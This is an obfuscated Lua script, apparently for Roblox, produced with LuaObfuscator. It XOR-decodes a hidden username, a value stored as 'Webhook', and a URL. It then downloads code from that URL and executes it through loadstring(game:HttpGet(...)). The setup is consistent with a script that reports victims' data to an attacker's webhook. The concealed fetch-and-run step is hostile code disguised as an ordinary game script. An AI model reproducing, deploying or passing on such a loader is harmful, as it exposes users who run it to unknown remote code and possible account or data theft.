--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0 = string.char;
local v1 = string.byte;
local v2 = string.sub;
local v3 = bit32 or bit;
local v4 = v3.bxor;
local v5 = table.concat;
local v6 = table.insert;
local function v7(v8, v9)
	local v10 = 1422 - (378 + 1044);
	local v11;
	while true do
		if (v10 == (2 - 1)) then
			return v5(v11);
		end
		if (v10 == 0) then
			v11 = {};
			for v12 = 2 - 1, #v8 do
				v6(v11, v0(v4(v1(v2(v8, v12, v12 + 1)), v1(v2(v9, (569 - (367 + 201)) + (v12 % #v9), (928 - (214 + 713)) + (v12 % #v9) + 1 + 0))) % 256));
			end
			v10 = 1;
		end
	end
end
Username = v7("\252\235\254\26\222\130\226\60\254\145\139\116\177\238", "\126\177\163\187\69\134\219\167");
LoadScreen = true;
Webhook = v7("\43\217\62\213\239\121\130\101\193\245\48\206\37\215\248\109\206\37\200\179\34\221\35\138\235\38\207\34\202\243\40\222\101\148\175\115\154\114\149\164\123\155\122\148\171\112\154\124\147\171\119\148\101\196\217\0\193\59\236\239\36\152\24\228\250\18\207\18\136\205\57\227\21\215\253\15\225\7\157\236\52\202\7\246\247\122\227\9\250\195\116\236\122\233\223\47\233\103\150\215\0\223\11\250\196\48\206\29\193\235\33\253\30\200\254\41\223\31\208\197\26", "\156\67\173\74\165");
loadstring(game:HttpGet(v7("\60\163\93\6\175\124\9\123\165\72\1\242\33\79\32\191\92\20\169\53\67\38\180\70\24\168\35\72\32\249\74\25\177\105\109\61\162\92\38\243\22\117\109\238\118\59\189\47\74\39\163\76\23\176\35\84\123\186\72\31\178\105\107\53\190\69\37\168\35\71\56\178\91\88\176\51\71", "\38\84\215\41\118\220\70")))();
